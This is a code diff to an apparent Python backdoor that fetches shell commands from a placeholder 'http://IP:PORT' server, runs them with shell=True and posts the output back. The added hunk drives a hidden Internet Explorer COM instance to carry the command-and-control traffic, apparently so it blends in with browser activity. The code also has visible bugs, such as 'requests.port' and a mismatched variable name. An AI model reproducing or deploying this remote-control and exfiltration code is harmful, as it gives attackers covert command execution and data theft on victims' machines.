@@ -61,7 +61,7 @@ while 1:
         break
         
     else:
-        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         post_response = requests.post(url='http://IP:PORT', data=CMD.stdout.read() )
         post_response = requests.port(url='http://IP:PORT', data=CMD.stderr.read() )
         
@@ -76,5 +76,42 @@ while 1:
     from time import sleep
     from win32com.client import Dispatch
     
+    # build browser instance
+    internet_explorer_instance = Dispatch('InternetExplorer.Application') 
+    internet_explorer_instance.Visible = 0
+    
+    # Post Request Parameters 
+    server_url = "http://IP:PORT"
+    target_frame = ""
+    flags = 0
+    
+    while 1:
+        internet_explorer_instance.Navigate("http://IP:PORT")
+        
+        while internet_explorer_instance.ReadyState != 4:
+            sleep(1)
+            
+        cmd = internet_explorer_instance.Document.body.innerHTML
+        cmd = unicode(cmd)
+        cmd = cmd.encode('ascii', 'ignore')
+        print '[+] We received command: ' + command
+        
+        if 'terminate' in command:
+            internet_explorer_instance.Quit()
+            break
+            
+        else:
+            exec_cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            
+            payload = exec_cmd.stdout.read()
+            post_parameter = buffer(payload)
+            internet_explorer_instance.Navigate(server_url, flags, target_frame, post_parameter)
+            
+        sleep(3)
+        
+        
+            
+            
+        
     
 
